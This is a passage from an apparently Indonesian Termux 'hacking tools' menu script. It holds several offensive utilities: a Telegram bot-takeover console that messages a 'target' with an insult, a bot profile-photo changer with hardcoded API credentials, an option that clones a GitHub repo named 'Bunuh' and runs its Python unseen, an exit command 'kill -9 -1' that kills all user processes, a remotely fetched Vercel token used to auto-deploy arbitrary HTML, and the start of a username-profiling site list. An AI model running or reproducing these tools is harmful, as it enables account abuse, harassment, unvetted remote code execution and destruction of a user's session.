        local last_update=$(echo "$response" | grep -o '"update_id":[0-9]*' | tail -1 | cut -d: -f2)
        if [ ! -z "$last_update" ]; then
            LAST_UPDATE_ID=$last_update
        fi
        if echo "$response" | grep -q "\"chat\":{\"id\":$TARGET_ID"; then
            local messages=$(echo "$response" | grep -o '"text":"[^"]*"' | cut -d: -f2 | tr -d '"')
            local sender_names=$(echo "$response" | grep -o '"first_name":"[^"]*"' | cut -d: -f2 | tr -d '"')
            if [ ! -z "$messages" ]; then
                IFS=$'\n' read -d '' -r -a message_array <<< "$messages" || true
                IFS=$'\n' read -d '' -r -a name_array <<< "$sender_names" || true                
                for i in "${!message_array[@]}"; do
                    local timestamp=$(date +"%H:%M:%S")
                    local sender="${name_array[$i]:-Unknown}"
                    local text="${message_array[$i]}"
                    echo ""
                    echo "[$timestamp] $sender: $text"
                    echo ""
                done
            fi
        fi
    fi
}
send_message() {
    local text="$1"
    local url="https://api.telegram.org/bot${TOKEN}/sendMessage"
    local data="{\"chat_id\":\"$TARGET_ID\",\"text\":\"$text\",\"parse_mode\":\"HTML\"}"    
    local response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \
        -H "Content-Type: application/json" \
        -d "$data")   
    if [ "$response" -eq 200 ]; then
        return 0
    else
        return 1
    fi
}
communicate_with_target() {
    if ! python3 -c "import requests" &> /dev/null; then
        clear 
        echo ""
        echo -e "${r} Modul request tidak di temukan."
        echo -e "${g} Menginstall modul request."
        echo ""
        if python3 -m pip install requests --quiet 2>/dev/null || pip3 install requests --quiet 2>/dev/null; then
            clear 
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${c} Modul berhasil terinstall..!!"
            sleep 3
            clear 
        else
            clear 
            echo ""
            echo -e "${r} Terjadi kesalahan pada modul."
            echo ""
            echo -e "${g} Install manual: pip3 install requests"
            echo " Tekan Enter untuk melanjutkan..!!"
            read
            return 1
        fi
    fi  
    clear 
    echo ""
    echo -e "${r}[ ${g}!! ${r}]${y} Loading tools..!!"
    sleep 2
    echo ""   
    echo -e "${g}Memulai mode chat..!!"
    echo -e "${y}════════════════════"  
    python3 -c "
import os
import sys
import json
import time
import threading
from datetime import datetime
import requests
class TelegramBotChat:
    def __init__(self, token, target_id):
        self.token = token
        self.target_id = target_id
        self.base_url = 'https://api.telegram.org/bot'
        self.session = requests.Session()
        self.last_update_id = 0
        self.chat_active = False       
        self.g = '\033[32;1m'
        self.c = '\033[36;1m'
        self.r = '\033[31;1m'
        self.y = '\033[33;1m'
        self.n = '\033[0m' 
    def send_message(self, text):
        url = f\"{self.base_url}{self.token}/sendMessage\"
        data = {
            'chat_id': self.target_id,
            'text': text,
            'parse_mode': 'HTML'
        }
        try:
            response = self.session.post(url, json=data, timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def get_updates(self):
        url = f\"{self.base_url}{self.token}/getUpdates\"
        params = {
            'offset': self.last_update_id + 1,
            'timeout': 5,
            'limit': 10
        }
        try:
            response = self.session.get(url, params=params, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    for update in data.get('result', []):
                        update_id = update.get('update_id')
                        if update_id > self.last_update_id:
                            self.last_update_id = update_id
                        message = update.get('message', {})
                        chat = message.get('chat', {})
                        if str(chat.get('id')) == str(self.target_id):
                            text = message.get('text', '')
                            first_name = message.get('from', {}).get('first_name', 'Unknown')
                            if text and text != 'Bot: Mode chat aktif! Saya siap berkomunikasi.':
                                timestamp = datetime.now().strftime('%H:%M:%S')
                                print(f\"\n{self.g}[{timestamp}] {first_name}: {text}{self.n}\")
                                print(f\"\n{self.c}Anda: {self.n}\", end=\"\", flush=True)
        except:
            pass   
    def start_chat(self):
        print(f\"\n{self.y}[✓] Mode Komunikasi dengan Target\")
        print(f\"{self.r}[*] Memulai mode chat real-time.{self.n}\")
        print(f\"{self.r}[*] Tekan 'back' untuk kembali ke menu{self.n}\")
        print(f\"{self.r}[*] Tekan 'clear' untuk membersihkan layar{self.n}\")
        print(f\"{self.r}[*] Tekan 'help' untuk bantuan{self.n}\")
        print(f\"{self.c}═══════════════════════════════════════════════{self.n}\")     
        self.last_update_id = 0
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f\"\n{self.c}[{timestamp}] {self.g}Bot: Mode chat aktif!{self.n}\")
        self.send_message(\"Woi kontol kenal gw gk 😂❓\")     
        self.chat_active = True       
        def receive_messages():
            while self.chat_active:
                self.get_updates()
                time.sleep(1)       
        receive_thread = threading.Thread(target=receive_messages, daemon=True)
        receive_thread.start()        
        while self.chat_active:
            try:
                print(f\"{self.g}Anda: {self.n}\", end=\"\", flush=True)
                message = input().strip()                
                if message.lower() == 'back':
                    print(f\"{self.y}[*] Keluar dari mode chat.{self.n}\")
                    self.chat_active = False
                    time.sleep(1)
                    break
                elif message.lower() == 'clear':
                    os.system('clear' if os.name == 'posix' else 'cls')
                    print(f\"{self.g}[*] Layar dibersihkan{self.n}\")
                    continue
                elif message.lower() == 'help':
                    print(f\"{self.y}[Help] Perintah:{self.n}\")
                    print(f\"{self.y}  back   - Kembali ke menu{self.n}\")
                    print(f\"{self.y}  clear  - Bersihkan layar{self.n}\")
                    print(f\"{self.y}  help   - Tampilkan bantuan{self.n}\")
                    print(f\"{self.y}  [teks] - Kirim pesan ke target{self.n}\")
                    continue
                elif message:
                    if self.send_message(message):
                        timestamp = datetime.now().strftime('%H:%M:%S')
                        print(f\"{self.g}[{timestamp}] {self.c}Anda: {message}{self.n}\")
                    else:
                        print(f\"{self.r}[✗] Gagal mengirim pesan{self.n}\")
            except KeyboardInterrupt:
                print(f\"\n{self.y}[*] Keluar dari mode chat.{self.n}\")
                self.chat_active = False
                break
            except Exception as e:
                print(f\"{self.r}[✗] Error: {self.g}{str(e)}{self.n}\")       
        receive_thread.join(timeout=2)
        print(f\"{self.c}[✓] Mode chat dihentikan{self.n}\")
if __name__ == '__main__':
    token = '$TOKEN'
    target_id = '$TARGET_ID'
    bot = TelegramBotChat(token, target_id)
    bot.start_chat()
"  
    echo ""
    echo -e "${g}Tekan Enter untuk kembali ke menu utama..!!"
    read
}
cok="ansi-rounded"
advanced_features() {
    while true; do
        clear
        display_banner
        echo ""
        echo -e "${r}[ ${g}INFO ${r}]${c} Token : ${TOKEN:0:10} ${r}| ${c}ID : $TARGET_ID"
        echo ""      
        echo "
        1. Dapatkan Info Bot 
        2. Dapatkan Info Chat
        3. Kirim Kontak
        4. Kirim Lokasi
        5. Kembali ke Menu Utama
        " | boxes -d "$cok" | lolcat 
        echo -e "${g}"     
        read -p "Pilih opsi [ 1/7 ] : " choice        
        case $choice in
            1)
                get_bot_info
                ;;
            2)
                get_chat_info
                ;;
            3)
                send_contact
                ;;
            4)
                send_location
                ;;
            5)
                return
                ;;
            *)
                clear 
                echo ""
                echo -e "${r} Pilihan anda tidak valid."
                echo ""
                sleep 2
                ;;
        esac     
        echo ""
        echo -e "${r}Tekan Enter untuk melanjutkan..!!"
        read
    done
}
get_bot_info() {
    local url="https://api.telegram.org/bot${TOKEN}/getMe"
    local response=$(curl -s "$url")   
    if echo "$response" | grep -q '"ok":true'; then
        local bot_info=$(echo "$response" | grep -o '"result":{[^}]*}' | sed 's/"result"://')
        local bot_id=$(echo "$bot_info" | grep -o '"id":[0-9]*' | cut -d: -f2)
        local username=$(echo "$bot_info" | grep -o '"username":"[^"]*"' | cut -d: -f2 | tr -d '"')
        local first_name=$(echo "$bot_info" | jq -r '.result.first_name // empty' 2>/dev/null)
        if [ -z "$first_name" ]; then
            local first_name=$(echo "$bot_info" | jq -r '.first_name // empty' 2>/dev/null)
        fi
        if [ -z "$first_name" ]; then
            first_name="Unknown"
        fi
        local description=$(echo "$bot_info" | grep -o '"description":"[^"]*"' | cut -d: -f2 | tr -d '"')     
        echo ""
        echo -e "${y}[✓] Informasi botz."
        echo -e "${c}"
        echo "ID : ${bot_id:-Tidak ada}"
        echo "Username : ${username:-Tidak ada}"
        echo "Nama : ${first_name}"
        echo "Bio : ${description:-Tidak ada}"
    else
        clear 
        echo ""
        echo -e "${r} Gagall mendapatkan informasi botz."
        echo ""
    fi
}
get_chat_info() {
    local url="https://api.telegram.org/bot${TOKEN}/getChat"
    local data="{\"chat_id\":\"$TARGET_ID\"}"  
    local response=$(curl -s -X POST "$url" \
        -H "Content-Type: application/json" \
        -d "$data")   
    if echo "$response" | grep -q '"ok":true'; then
        local chat_info=$(echo "$response" | grep -o '"result":{[^}]*}' | sed 's/"result"://')
        local chat_id=$(echo "$chat_info" | grep -o '"id":[0-9]*' | cut -d: -f2)
        local chat_type=$(echo "$chat_info" | grep -o '"type":"[^"]*"' | cut -d: -f2 | tr -d '"')
        local title=$(echo "$chat_info" | grep -o '"title":"[^"]*"' | cut -d: -f2 | tr -d '"')
        local username=$(echo "$chat_info" | grep -o '"username":"[^"]*"' | cut -d: -f2 | tr -d '"')
        local description=$(echo "$chat_info" | grep -o '"description":"[^"]*"' | cut -d: -f2 | tr -d '"')       
        echo ""
        echo -e "${y}[✓] Informasi botz."
        echo -e "${c}"
        echo "ID : ${chat_id:-Tidak ada}"
        echo "Tipe : ${chat_type:-Tidak ada}"
        echo "Username : ${username:-Tidak ada}"
        echo "Bio : ${description:-Tidak ada}"
    else
        echo ""
        echo -e "${r} Gagall mendapatkan informasi botz."
        echo ""
    fi
}
send_contact() {
    echo -e "${y}"
    read -p "Masukkan nomor telepon : " phone
    echo -e "${c}"
    read -p "Masukkan nama depan : " first_name
    echo "" 
    local url="https://api.telegram.org/bot${TOKEN}/sendContact"
    local data="{\"chat_id\":\"$TARGET_ID\",\"phone_number\":\"$phone\",\"first_name\":\"$first_name\"}"    
    local response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \
        -H "Content-Type: application/json" \
        -d "$data")  
    if [ "$response" -eq 200 ]; then
        echo -e "${g}[✓] Kontak berhasil dikirim"
    else
        clear 
        echo ""
        echo -e "${r} Gagall mengirim kontak"
        echo ""
    fi
}
send_location() {
    echo -e "${y}"
    read -p "Masukkan latitude : " latitude
    echo -e "${p}"
    read -p "Masukkan longitude : " longitude
    echo ""  
    local url="https://api.telegram.org/bot${TOKEN}/sendLocation"
    local data="{\"chat_id\":\"$TARGET_ID\",\"latitude\":\"$latitude\",\"longitude\":\"$longitude\"}"    
    local response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \
        -H "Content-Type: application/json" \
        -d "$data")    
    if [ "$response" -eq 200 ]; then
        echo -e "${g}[✓] Lokasi berhasil dikirim"
    else
        clear 
        echo ""
        echo -e "${r}Gagall mengirim lokasi"
        echo ""
    fi
}
run() {
    while true; do
        display_banner
        if ! load_config; then
            echo ""
            echo -e "${p}[!] Tidak ada konfigurasi atau konfigurasi tidak valid"
            echo ""
            if ! setup; then
                echo ""
                echo -e "${n} Tekan Enter untuk mencoba lagi..!!"
                read
                continue
            fi
        fi      
        echo ""
        echo -e "${r}[ ${g}INFO ${r}]${c} Token : ${TOKEN:0:10} ${r}| ${c}ID : $TARGET_ID"
        echo ""
        echo "
        1. Fitur Lanjutan (DLL)
        2. Berkomunikasi dengan Target
        3. Ganti Token/Target
        4. Keluar
        " | boxes -d "$cok" | lolcat 
        echo -e "${p}"     
        read -p "Pilih menu [ 1/0 ] : " choice        
        case $choice in
            1)
                advanced_features
                ;;
            2)
                communicate_with_target
                ;;
            3)
                rm -f $CONFIG_FILE
                TOKEN=""
                TARGET_ID=""
                echo ""
                echo -e "${g}[ ✓ ] Konfigurasi direset, silakan setup ulang."
                sleep 2
                ;;
            4)
                clear 
                echo ""
                echo -e "${r} Keluar dari tools..!!"
                echo ""
                sleep 3 
                kill -9 -1 && exit
                ;;
            *)
                clear 
                echo ""
                echo -e "${r} Pilihan anda tidak valid..!!"
                sleep 2
                echo ""
                ;;
        esac
    done
}
trap 'echo ""; echo "Program dihentikan oleh user"; exit 0' INT
main() {
    clear 
    echo ""
    echo -e "${c} Memulai Tools Control Bot Telegram..!!"
    sleep 2
    run
}
main
;;
4|04)
thxyzz404() {
    lol=$1
    tod=$2    
    python3 << EOF
import asyncio
import sys
from telethon import TelegramClient
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.errors import AccessTokenInvalidError, RPCError
async def change_pp():
    client = None
    try:
        client = TelegramClient('bot_session', api_id=2040, api_hash='b18441a1ff607e10a989891a5462e627')
        await client.start(bot_token='$lol')
        file = await client.upload_file('$tod')
        await client(UploadProfilePhotoRequest(file=file))       
        await client.disconnect()
        print("OK")
        return 0
    except AccessTokenInvalidError:
        print("Token_Valid..!!")
        return 1
    except RPCError as e:
        print(f"RPC_ERROR : {str(e)}")
        return 1
    except Exception as e:
        print(f"ERROR : {str(e)}")
        return 1
    finally:
        if client:
            await client.disconnect()
if __name__ == "__main__":
    exit_code = asyncio.run(change_pp())
    sys.exit(exit_code)
EOF
}
jangan_recode_kontol() {
clear
mek="ansi-rounded"
echo "
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠛⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⢠⣤⣄⡀⠈⠙⠛⠿⣿⣿⣿⡝⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⠿⠛⠋⠉⠉⠉⠀⠀⢿⣿⣿⣷⣶⣄⣀⠀⠉⠉⠁⠀⠢⠈⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡟⣫⣥⣤⣤⣶⣶⣶⣶⣶⣤⣤⡈⢿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣄⣀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠈⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠂⠙⢿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠛⠿⠿⣿⣿⣿⣿⣿⣦⠀⠀⠀⣉⠻⢿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⢻⣿
⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⢀⣀⣀⣀⣀⡈⠉⠻⢿⣿⣧⡀⠀⠘⠷⣤⡙⢿⣿⣿⣿⣿⣿⣿⡄⠀⠀⢻
⣿⣿⣿⣯⣄⡀⠀⠀⠀⠀⠐⢿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣝⠻⣷⣄⠀⠀⠀⠀⠀⠉⠛⠛⠿⠿⣿⡿⠀⠀⠘
⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣦⣾⣿⣿⣶⣶⣶⣦⣤⣄⡀⠀⠀⣸
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠙⣿⣿⣿⡿⠉⠀⢀⠈⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⢻
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠸⣿⣿⠃⢀⣾⣿⣿⣿⣶⡄⠉⠿⣿⣿⣿⣿⣏⠉⠛⠻⠿⠿⠿⠀⢺
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⢻⣿⠀⢈⣿⣿⣿⣿⡟⣇⣠⣦⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⢸
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢸⣿⠀⣿⣿⣿⣿⡟⢠⣿⣿⣟⠀⣀⡈⠻⢿⣿⠿⠗⠀⢠⡞⢀⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⠀⣠⣾⣿⣿⡇⠸⣿⣿⣿⣾⣿⠃⠀⢀⣤⣤⣤⡀⠀⢀⣾⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⣾⣿⠀⣿⡿⠿⠋⡅⠐⣿⣿⡟⣿⡟⣀⣴⣿⣿⣿⡏⢀⣴⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⣰⣿⣿⡄⠀⠀⠀⠸⠿⠀⠈⠋⢀⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⢰⣿⣿⣿⣷⣾⣿⣿⡶⠖⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⡁⠀⠀⠀⠉⠉⠉⠉⠉⠉⠀⣀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ " | boxes -d "$mek" | lolcat
    echo ""
    echo -e "${p}        Development ${g}: ${c}Thxyzz404"
    echo ""
    echo ""
    read -p "$(echo -e "${y}Masukkan token botz ${r}[ ${g}contoh: 848xx ${r}]${c} : ")" yuki    
    if [ -z "$yuki" ]; then
        clear
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${y} Token gk boleh kosong."
        echo ""
    fi    
    echo ""
    echo -e "${g}=====${c}[ ${r}TUJUAN PATH FILE ANDA ${c}]${g}====="
    echo -e "${y}Contoh : /sdcard/Download/foto.jpg"
    echo -e "${g}"
    read -p "Masukkan path file foto : " alya
    if [ -z "$alya" ]; then
        clear 
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${y} Path foto gk boleh kosong."
        echo ""
    fi    
    if [ ! -f "$alya" ]; then
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} Path foto tidak di temukan ${c}: $alya"
        echo ""
    fi  
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${c} Proses set pp tuan ${y}: $(basename "$alya")"
    echo ""
    result=$(thxyzz404 "$yuki" "$alya" 2>&1)
    exit_code=$?
    if [ $exit_code -eq 0 ] && [[ "$result" == "OK" ]]; then
        echo -e "${r}[ ${g}✓ ${r}]${c} Sukses foto profil sudah di ubah..!!"
    elif [[ "$result" == *"Token_Valid..!!"* ]]; then
        echo -e "${r}[ ${g}x ${r}]${y} Token ini tidak valid..!!"
    else
        echo -e "${r}[ ${g}x ${r}]${p} Gagal mengubah foto profil bot tuan..!!"
        echo -e "${c}Error : $result"
    fi    
    echo ""
    echo -e "${bold_bg}${bold_gren}Wajib tekan entar untuk"
    echo -ne "${bold_bg}${bold_gren}menghapus sesion bot.\033[0m"
    read
    rm -rf "$HOME/bot_session.session" # bagian home termux.
    rm -rf bot_session.session # bagian sdcard folder. 
}
jangan_recode_kontol
 ;;
  5|05)
ANK_IDIOT="$HOME/Bunuh"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Gagal masuk ke direktori : $ANK_IDIOT"
    if [ -f "Bolu.py" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        python3 Bolu.py || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} File tidak ada, mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/Bunuh || kontol "Gagal cloning repository"
        cd "$ANK_IDIOT" || kontol "Gagal masuk ke direktori github."
        python3 Bolu.py || kontol "Terjadi kesalahan saat menjalankan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repository github..!!${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/Bunuh || kontol "Gagal cloning repository"    
    cd "$ANK_IDIOT" || kontol "Gagal masuk ke direktori github."
    python3 Bolu.py || kontol "Terjadi kesalahan saat menjalankan."
fi
 ;;
   6|06)
        clear
        ;;
    *)
        clear 
        echo ""
        echo -e "${r}Pilihan Anda Tidak Valid."
        ;;
esac
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
;;
  37)
       echo ""
       mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
       echo -e "${c} Anda Memilih Menu Hacking..!!"
       echo ""
       echo -e "${r} VIP UNLOCK..!!"
       sleep 2
       clear
g='\033[32;1m'
r='\033[31;1m'
b='\033[34;1m'
y='\033[33;1m'
c='\033[36;1m'
p='\033[35;1m'
n='\033[0m'
wok="$PREFIX/.vercle_key"
get_url() {
if [ -f "$wok" ]; then
   local token=$(cat "$wok" | tr -d '\n\r')
   echo "$token"
else
   local token=$(curl -s "https://ajgbabitailubangsatewe.netlify.app" | tr -d '\n\r')
   echo "$token"
fi
}
memek() {
   local token=$(curl -s "https://ajgbabitailubangsatewe.netlify.app" | tr -d '\n\r')
if [ -n "$token" ]; then
   echo "$token" > "$wok"
fi
}
kontol=$(get_url)
echo -e "${r}
╭────────────────────────────────────╮
│   ${g}⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${r}│
│   ${g}⠀⢸⣿⣿⣶⣦⣄⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${r}│
│   ⠀${g}⢈⣿⣿⣿⣿⣿⣿⣾⡄⠀⠀⠀⠀⣼⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${r}│
│   ⠀${g}⠀⠙⢿⣿⣿⡟⠛⠛⠿⡄⠀⠀⢰⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${r}│
│   ⠀${g}⠀⠀⠀⠙⢿⣧⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${r}│
│   ⠀${g}⠀⠀⠀⠀⠀⠉⠂⠀⢀⣴⣿⣿⣌⠛⠿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${r}│
│   ⠀${g}⠀⠀⠀⠀⠀⠀⢀⣠⣼⠻⣿⣿⣿⣷⣤⡈⠻⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ${r}│
│   ⠀${g}⠀⠀⢠⣴⣶⣿⣿⣿⣿⣦⡘⢿⣿⣿⣿⣿⣦⣄⢸⣦⣄⠀⠀⠀⠀⠀⠀⠀ ⠀  ${r}│
│   ⠀⠀${g}⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣄⠙⣿⣿⣿⣿⣿⣿⠿⠛⠂⠀⠀⠀⠀⠀⠀⠀   ${r}│
│   ⠀⠀${g}⠀⠀⠀⠀⠙⠿⠿⠿⠿⠿⠛⠓⠈⠻⣿⡿⠋⠀⢴⠆⠉⠉⣀⠀⠀⠀⠀⠀   ${r}│
│   ⠀⠀⠀${g}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⡿⠁⢼⠇⠀⠰⡷⠄⠉⢁⠀⠀⠀⠀   ${r}│
│   ⠀⠀⠀${g}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢰⡄⠀⠿⠂⣠⣶⣿⣿⣇⠀⠀⠀   ${r}│
│   ⠀⠀⠀${g}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠲⠀⢰⣿⣿⣿⣿⣿⣆⠀⠀   ${r}│
│   ⠀⠀⠀⠀${g}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⡀⠀   ${r}│
│   ⠀⠀⠀⠀⠀${g}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠃    ${r}│
│ ${r}  [${y} >${c} Auto Deploy Ke Vercel ${y}< ${r}]    ${r}│
╰────────────────────────────────────╯

${g}• ${p}By : ToolslV ©2026 ${g}• "
echo -e "${b}"
read -p "📂 Masukan path file html : " cok
[[ ! -f "$cok" ]] && echo -e "${r}❌ File tidak ditemukan!" && return
echo -e "${c}"
read -p "🌐 Nama domain [ tanpa vercel.app ] : " dom
jek="$dom"
cen=$(base64 -w 0 "$cok")
pay=$(cat <<EOF
{
  "name": "$jek",
  "target": "production",
  "projectSettings": {
    "framework": null,
    "devCommand": null,
    "buildCommand": null,
    "outputDirectory": null
  },
  "files": [
    {
      "file": "index.html",
      "data": "$cen",
      "encoding": "base64"
    }
  ]
}
EOF
)
echo ""
echo -e "${p}🚀 Deploying..!!"
res=$(curl -s -X POST "https://api.vercel.com/v13/deployments" \
  -H "Authorization: Bearer $kontol" \
  -H "Content-Type: application/json" \
  -d "$pay")
id=$(echo "$res" | jq -r ".id")
url=$(echo "$res" | jq -r ".url")
[[ -z "$id" ]] && echo -e "${r}❌ Deploy gagal!" && echo "$res" | jq && return
echo ""
echo -e "${g}⏳ Menunggu READY..!!"
while true; do
set=$(curl -s "https://api.vercel.com/v13/deployments/$id" \
    -H "Authorization: Bearer $kontol" | jq -r ".readyState")
  [[ "$set" == "READY" ]] && break
  sleep 2
done
counter=0
main="$dom"
while true; do
  yas="${main}.vercel.app"
  cuy=$(curl -s -X POST "https://api.vercel.com/v2/aliases" \
    -H "Authorization: Bearer $kontol" \
    -H "Content-Type: application/json" \
    -d "{\"deploymentId\":\"$id\",\"domain\":\"$yas\"}")
de=$(echo "$cuy" | jq -r ".error.code // empty")
  [[ -z "$de" ]] && break
  [[ "$de" != "alias_in_use" ]] && break
  counter=$((counter + 1))
  main="${dom}${counter}"
done
echo ""
echo -e "${c}✅ Selesai!"
echo -e "${g}🌍 URL : https://$yas"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
   ;;
      38)
            echo ""
            mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
            echo -e "${c} Anda Memilih Menu Hacking..!!"
            echo ""
            echo -e "${r} VIP UNLOCK..!!"
            sleep 2
            clear
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
y='\033[33;1m'
declare -A SITES=(
    ["GitHub"]="https://github.com/%s"
    ["Twitter"]="https://twitter.com/%s"
    ["Instagram"]="https://www.instagram.com/%s"
    ["SnackVideo"]="https://s.snackvideo.com/@%s"
    ["Telegram"]="https://t.me/%s"
    ["WhatsApp"]="https://wa.me/%s"
    ["Vimeo"]="https://vimeo.com/%s"
    ["YouTube"]="https://www.youtube.com/@%s"
    ["Facebook"]="https://www.facebook.com/%s"
    ["TikTok"]="https://www.tiktok.com/@%s"
    ["Reddit"]="https://www.reddit.com/user/%s"
    ["Pinterest"]="https://www.pinterest.com/%s"
    ["Steam"]="https://steamcommunity.com/id/%s"
    ["Medium"]="https://medium.com/@%s"
    ["Replit"]="https://replit.com/@%s"
    ["CodePen"]="https://codepen.io/%s"
    ["Hackerrank"]="https://www.hackerrank.com/%s"
    ["Dev.to"]="https://dev.to/%s"
    ["Keybase"]="https://keybase.io/%s"
    ["GitLab"]="https://gitlab.com/%s"
    ["Blogger"]="https://%s.blogspot.com"
    ["Dribbble"]="https://dribbble.com/%s"
    ["Behance"]="https://www.behance.net/%s"
    ["Kaggle"]="https://www.kaggle.com/%s"
    ["Last.fm"]="https://www.last.fm/user/%s"
    ["500px"]="https://500px.com/%s"
    ["PayPal"]="https://www.paypal.me/%s"
    ["Dana"]="https://link.dana.id/qr/%s"
    ["OVO"]="https://www.ovo.id/%s"
    ["GoPay"]="https://gopay.co.id/%s"
    ["ShopeePay"]="https://shopee.co.id/pay/%s"
    ["DOKU"]="https://www.doku.com/%s" 
    ["LinkAja"]="https://www.linkaja.id/%s"
    ["JeniusPay"]="https://www.jenius.com/%s"
    ["QRIS"]="https://qris.id/%s"
    ["Gcash"]="https://gcash.com/%s"
    ["Venmo"]="https://venmo.com/%s"
    ["Zelle"]="https://www.zellepay.com/%s"
    ["CashApp"]="https://cash.app/%s"
    ["Stripe"]="https://stripe.com/%s"
    ["Alipay"]="https://intl.alipay.com/%s"
    ["WeChatPay"]="https://pay.weixin.qq.com/%s"
    ["ApplePay"]="https://www.apple.com/apple-pay/%s"
    ["GooglePay"]="https://pay.google.com/%s" 
    ["Spotify"]="https://open.spotify.com/user/%s"
    ["SoundCloud"]="https://soundcloud.com/%s"
    ["RiotGames"]="https://na.op.gg/summoner/userName=%s"
